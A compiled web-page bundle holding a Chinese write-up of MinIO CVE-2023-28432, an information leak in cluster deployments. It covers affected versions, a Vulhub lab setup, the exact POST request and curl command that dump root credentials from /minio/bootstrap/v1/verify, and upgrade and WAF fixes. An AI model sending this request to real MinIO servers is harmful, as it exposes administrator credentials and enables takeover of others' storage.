import{_ as t}from"./plugin-vue_export-helper-c27b6911.js";import{r as d,o as r,c as s,a as e,b as i,d as a,e as o}from"./app-58e4a7d6.js";const l={},c=e("h2",{id:"漏洞描述",tabindex:"-1"},[e("a",{class:"header-anchor",href:"#漏洞描述","aria-hidden":"true"},"#"),i(" 漏洞描述")],-1),u=e("p",null,"MinIO是一个开源对象存储系统。",-1),p=e("p",null,[i("在其"),e("code",null,"RELEASE.2023-03-20T20-16-18Z"),i("版本（不含）以前，集群模式部署下存在一处信息泄露漏洞，攻击者可以通过发送一个POST数据包获取进程所有的环境变量，其中就包含账号密码"),e("code",null,"MINIO_ROOT_USER"),i("和"),e("code",null,"MINIO_ROOT_PASSWORD"),i("。")],-1),h=e("p",null,"参考链接：",-1),m={href:"https://github.com/minio/minio/security/advisories/GHSA-6xvq-wj2x-3h3q",target:"_blank",rel:"noopener noreferrer"},v={href:"https://mp.weixin.qq.com/s/GNhQLuzD8up3VcBRIinmgQ",target:"_blank",rel:"noopener noreferrer"},g=o(`<h2 id="漏洞影响" tabindex="-1"><a class="header-anchor" href="#漏洞影响" aria-hidden="true">#</a> 漏洞影响</h2><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>MinIO &lt;= RELEASE.2023-03-20T20-16-18Z
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><h2 id="网络测绘" tabindex="-1"><a class="header-anchor" href="#网络测绘" aria-hidden="true">#</a> 网络测绘</h2><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>app=&quot;minio&quot;
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><h2 id="环境搭建" tabindex="-1"><a class="header-anchor" href="#环境搭建" aria-hidden="true">#</a> 环境搭建</h2><p>Vulhub执行如下命令启动一个MinIO集群，其中包含3个以集群模式运行的服务：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>docker-compose up -d
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>集群启动后，访问<code>http://your-ip:9001</code>可以查看Web管理页面，访问<code>http://your-ip:9000</code>是API服务。</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/image-20230504102151673.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><h2 id="漏洞复现" tabindex="-1"><a class="header-anchor" href="#漏洞复现" aria-hidden="true">#</a> 漏洞复现</h2><p>这个漏洞存在于API节点<code>http://your-ip:9000/minio/bootstrap/v1/verify</code>上，发送如下数据包即可查看泄露的环境变量：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>POST /minio/bootstrap/v1/verify HTTP/1.1
Host: your-ip:9000
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en-US;q=0.9,en;q=0.8
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.5481.178 Safari/537.36
Connection: close
Cache-Control: max-age=0
Content-Type: application/x-www-form-urlencoded
Content-Length: 0
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/image-20230504102419760.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>也可以直接 curl：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>curl -XPOST http://your-ip:9000/minio/bootstrap/v1/verify
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>可见，其中包含<code>MINIO_ROOT_USER (accessKey)</code>和<code>MINIO_ROOT_PASSWORD (secretKey)</code>。使用这个账号密码，即可成功登录管理后台：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>MINIO_ROOT_USER		minioadmin
MINIO_ROOT_PASSWORD	minioadmin-vulhub
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div></div></div><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/image-20230504102729716.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><h2 id="漏洞修复" tabindex="-1"><a class="header-anchor" href="#漏洞修复" aria-hidden="true">#</a> 漏洞修复</h2><p>目前官方已发布安全修复版本，受影响用户可以升级到RELEASE.2023-03-20T20-16-18Z 及以上版本。</p>`,20),b={href:"https://github.com/minio/minio/releases/tag/RELEASE.2023-03-20T20-16-18Z",target:"_blank",rel:"noopener noreferrer"},_=e("p",null,[i("临时修复方案，在 waf/ips 等安全产品上配置策略，拒绝所有 post 到 "),e("code",null,"/minio/bootstrap/v1/verify"),i(" 流量。")],-1);function x(f,O){const n=d("ExternalLinkIcon");return r(),s("div",null,[c,u,p,h,e("ul",null,[e("li",null,[e("a",m,[i("https://github.com/minio/minio/security/advisories/GHSA-6xvq-wj2x-3h3q"),a(n)])]),e("li",null,[e("a",v,[i("https://mp.weixin.qq.com/s/GNhQLuzD8up3VcBRIinmgQ"),a(n)])])]),g,e("p",null,[e("a",b,[i("https://github.com/minio/minio/releases/tag/RELEASE.2023-03-20T20-16-18Z"),a(n)])]),_])}const S=t(l,[["render",x],["__file","MinIO 集群模式信息泄露漏洞 CVE-2023-28432.html.vue"]]);export{S as default};
